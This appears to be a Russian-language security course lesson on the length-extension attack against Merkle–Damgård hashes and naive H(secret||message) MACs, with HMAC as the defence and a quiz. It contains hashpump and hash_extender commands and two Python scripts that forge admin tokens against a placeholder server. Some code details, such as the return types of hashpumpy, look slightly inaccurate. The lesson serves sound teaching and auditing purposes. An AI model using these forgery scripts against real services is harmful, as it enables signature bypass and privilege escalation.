---
id: crypto-merkle
title: "Merkle–Damgård и length extension: подделка H(secret||msg) без знания ключа"
category: crypto
parent: crypto-hmac
difficulty: hard
order: 2
tags: [crypto, merkle-damgard, length-extension, hashpump, hmac, mac, padding, sha256, md5]
prerequisites: [crypto-hashing, crypto-hmac]
useful_for:
  - "Эксплуатировать наивные MAC вида H(secret||message)"
  - "Понимать, почему HMAC устойчив к length extension"
  - "Ломать подписанные токены и cookie на CTF и в реальных приложениях"
estimated_minutes: 40
summary: "Атака length extension на хэши семейства Merkle–Damgård: как по H(secret||msg) достроить H(secret||msg||padding||extra) без ключа, как это ломает наивные MAC и подписанные cookie, и почему HMAC этой атаке не подвержен. Практика с hashpump и самописным эксплойтом."
---

## Конструкция Merkle–Damgård

MD5, SHA-1 и SHA-256 обрабатывают сообщение блоками фиксированного размера, поддерживая **внутреннее состояние**:

```
h_0 = IV (фиксированное)
h_i = f(h_{i-1}, m_i)       для каждого блока m_i
digest = h_n
```

Здесь `f` — компрессионная функция. Ключевое: **финальный дайджест — это просто последнее внутреннее состояние `h_n`**, «замороженное» без дополнительного финального преобразования (в отличие от SHA-3/sponge).

Следствие: если вы знаете `h_n` (дайджест `H(secret || msg)`), вы знаете **внутреннее состояние** после обработки `secret || msg`. Можно «продолжить» вычисление с этого состояния, добавив новые блоки, — **не зная `secret`**. Это и есть length extension.

## Padding: что нужно знать

Прежде чем продолжить, хэш-функция **дополняет** сообщение по схеме Merkle–Damgård: `msg || 0x80 || 0x00... || len(msg)*8` (64-битная длина). Атакующему нужно знать эту padding-строку, чтобы корректно построить продолжение. Padding зависит только от **длины** `secret || msg`, не от содержимого. Значит, атакующему достаточно знать **длину секрета** (не сам секрет!).

## Атака: пошагово

Дано: `H(secret || msg)` = известный MAC, и длина `secret` = `k` байт. Хотим MAC для `secret || msg || extra` (с произвольным `extra`).

1. Вычисляем padding `pad = 0x80 || 0x00... || (k + len(msg))*8` (до границы блока).
2. «Новый» дайджест `h'` — это внутреннее состояние, полученное из старого дайджеста (для SHA-256 — просто разбить на 8 слов).
3. Продолжаем хэширование с состояния `h'`, обрабатывая блоки `extra`.
4. Получаем `H(secret || msg || pad || extra)`.

При этом **новое сообщение** для сервера: `msg || pad || extra`. Сервер вычислит `H(secret || msg || pad || extra)` и получит тот же MAC. Подпись валидна без знания ключа.

## Практический пример с hashpump

```bash
# hashpump -s <original_sig> -d <original_data> -a <data_to_append> -k <key_length>
hashpump -s "6f5c..." -d "user=guest" -a "&role=admin" -k 16
# output:
# New signature: <hex>
# New data: user=guest\x80\x00...\x00&role=admin
```

```python
import hashpumpy
new_sig, new_data = hashpumpy.hashpump(
    "6f5c...", b"user=guest", b"&role=admin", 16)
print(new_sig.hex())
print(repr(new_data))
```

Отправляем `new_data` с `new_sig` — сервер проверяет `H(secret || new_data)` и получает тот же MAC.

## Почему HMAC защищён

HMAC использует **два прохода** и внешний хэш:

```
HMAC(K,m) = H((K⊕opad) || H((K⊕ipad) || m))
```

Внутренний хэш `H((K⊕ipad)||m)` — это значение, но оно передаётся **внутрь** внешнего хэша, а не является финальным дайджестом. Атакующий не может «продолжить» с него, потому что внешний хэш начинается с секрета `(K⊕opad)`, которого он не знает. Кроме того, финализация внешнего хэша «закрывает» состояние. Поэтому HMAC устойчив к length extension, даже если базовый хэш (MD5) сломан по коллизиям.

## Реальные проявления

- **Подписанные cookie** вида `data || H(secret || data)` без HMAC.
- **API-токены** `payload || md5(secret || payload)`.
- **Flickr API** (исторически) — length extension на MD5.
- **Самописные «подписи»** в мобильных API, IoT, legacy-системах.

Признак: сервер проверяет `H(secret || data) == provided_hash` — почти наверняка уязвим.

## Практический пример: полный эксплойт

```python
import hashpumpy, requests

# 1. Получаем легитимный токен
r = requests.post("http://target/login", data={"user": "guest"})
token, sig = r.json()["token"], r.json()["sig"]

# 2. Строим расширение
new_sig, new_data = hashpumpy.hashpump(sig, token.encode(), b"admin=true", 16)

# 3. Предъявляем подделку
r2 = requests.get("http://target/admin",
                  headers={"X-Token": new_data, "X-Sig": new_sig})
print(r2.text)
```

## Инструменты и команды

```bash
pip install hashpumpy
sudo apt install hashpump
# для SHA-1/SHA-256 аналог — собственный скрипт или расширение hashpump
```

## Частые ошибки

- **Не знать длину секрета.** Padding зависит от неё; часто её можно угадать/подобрать.
- **Путать length extension и коллизию.** Это разные атаки.
- **Пытаться применить к HMAC.** HMAC устойчив.
- **Забыть про padding в новом сообщении.** Он обязателен.
- **Неверная кодировка** (hex vs bytes) при передаче.
- **SHA-3/BLAKE2 не уязвимы** — не тратьте время.

## Другие конструкции и почему они устойчивы

- **HMAC** — два прохода, внешний хэш финализирован → length extension невозможен.
- **SHA-3 (sponge)** — нет «продолжаемого» состояния; атака неприменима.
- **HAIFA** (используется в BLAKE) — добавляет счётчик блоков и salt в компрессию, что ломает extension.
- **Prefix-free encoding / length-prefixing** — если длина сообщения кодируется явно, extension усложняется.
- **Double hashing** (`H(H(m))`) — некоторые считают защитой, но это не всегда спасает (нужен анализ).

Правило: **никогда не строите MAC как `H(key || message)`**. Используйте HMAC или AEAD.

## Практический эксплойт: подписанный токен

```python
import hashpumpy, requests

# Сервер: sig = sha256(secret + data).hexdigest()
# Мы знаем data, sig и длину secret (например, 16)
orig_data = b"user=guest&admin=false"
orig_sig  = "abcdef..."          # получили легитимно
key_len   = 16

new_sig, new_data = hashpumpy.hashpump(
    orig_sig, orig_data, b"&admin=true", key_len)

# new_data = orig_data || md5/sha padding || "&admin=true"
r = requests.post("http://target/", data={"token": new_data, "sig": new_sig})
print(r.text)
```

Если сервер использует SHA-1/SHA-256, hashpumpy тоже поддерживает (через `hash_extender`).

## Защита

- **HMAC** — правильный MAC.
- **Не использовать `H(secret || msg)`** нигде: ни в cookies, ни в API, ни в подписях.
- **AEAD** для шифрования+аутентификации.
- **Constant-time** сравнение MAC.
- **Секрет достаточной длины** и уникальность.

## Разбор: вычисляем padding вручную

Для SHA-256 блок = 64 байта. Padding:

```
pad = 0x80 || 0x00 × k || length (8 байт, big-endian)
```

где `k` выбрано так, чтобы `len(secret||msg) + 1 + k + 8` было кратно 64. Длина — в **битах**.

```python
import struct
def md_padding(msg_len_bytes, block=64):
    pad_len = block - ((msg_len_bytes + 1 + 8) % block) - 1
    return b"\x80" + b"\x00"*pad_len + struct.pack(">Q", msg_len_bytes*8)

# пример для secret(16) + msg(10) = 26 байт
print(md_padding(26).hex())
```

При продолжении хэширования атакующий использует это padding как часть нового сообщения.

## Восстановление внутреннего состояния

Для SHA-256 дайджест — это 8 слов (32 байта). Их можно использовать как начальное состояние для продолжения. Для этого в библиотеках (или своём коде) нужно уметь запускать компрессионную функцию с заданным `h_0..h_7`.

```python
import struct
# старый дайджест -> 8 слов big-endian
h = struct.unpack(">8I", bytes.fromhex(original_sig))
# продолжаем с этого состояния, обрабатывая extra-блоки
```

Именно это делают `hashpump`/`hash_extender` внутри.

## Разбор: hash_extender для SHA-256

```bash
# hash_extender --data <orig> --secret-format=raw --append <extra> \
#   --signature <sig> --format sha256 --secret-length <len>
hash_extender --data "user=guest" --append "&admin=1" \
  --signature "abcd..." --format sha256 --secret-length 16
# -> New signature + New string
```

## Разбор: почему это «бесплатно» для атакующего

Атакующему нужно только:
1. Знать хэш `H(secret||msg)` (он в токене/cookie).
2. Знать/угадать **длину** `secret`.
3. Уметь отправить расширенное сообщение.

Сам секрет не нужен. Длина угадывается перебором (8..64) — по числу запросов понятно, какая верна.

## Как не застрять

- **Ищите `H(secret || data)`.** Это сигнал.
- **Узнайте/угадайте длину секрета** (часто 8–32 байта; можно перебрать).
- **Используйте hashpump/hashpumpy.**
- **Проверьте, что хэш Merkle–Damgård** (MD5/SHA-1/SHA-256), а не SHA-3.
- **Если HMAC — ищите другой вектор** (слабый ключ, alg confusion).
- **Проверяйте сходимость** на сервере.

## Квиз

```quiz
- question: "Какое свойство Merkle-Damgard открывает length extension?"
  options:
    - "блочная структура без ключа"
    - "финальный digest равен внутреннему состоянию, с которого можно продолжить"
    - "использование XOR"
    - "малый размер выхода"
  answer: 1
- question: "Какую конструкцию MAC ломает length extension?"
  options:
    - "HMAC(K, m)"
    - "H(secret || message)"
    - "AES-GCM"
    - "Poly1305"
  answer: 1
- question: "Почему HMAC устойчив к length extension?"
  options:
    - "Он использует два прохода с ключом в начале, внешний хэш финализирован"
    - "Он не использует хэш"
    - "Он короче"
    - "Он использует SHA-3"
  answer: 0
- question: "Что обязательно должен знать атакующий для length extension?"
  options:
    - "сам секретный ключ"
    - "длину секретного ключа"
    - "полный MAC-алгоритм в исходниках"
    - "приватный RSA-ключ"
  answer: 1
- question: "Какой инструмент выполняет length extension «из коробки»?"
  options:
    - "hashcat"
    - "hashpump / hash_extender"
    - "john"
    - "nmap"
  answer: 1
```

## Где пригодится

- **CTF crypto/web:** подписанные cookie, токены, «проверка целостности» — очень частый вектор.
- **Bug bounty / пентест:** обход подписи в самописных API и сессиях.
- **Аудит кода:** выявление `H(secret‖data)` вместо HMAC.
- **Работа (SOC/IR):** понимание инцидентов с подделкой токенов.
- **Разработка:** почему стандарт требует именно HMAC.
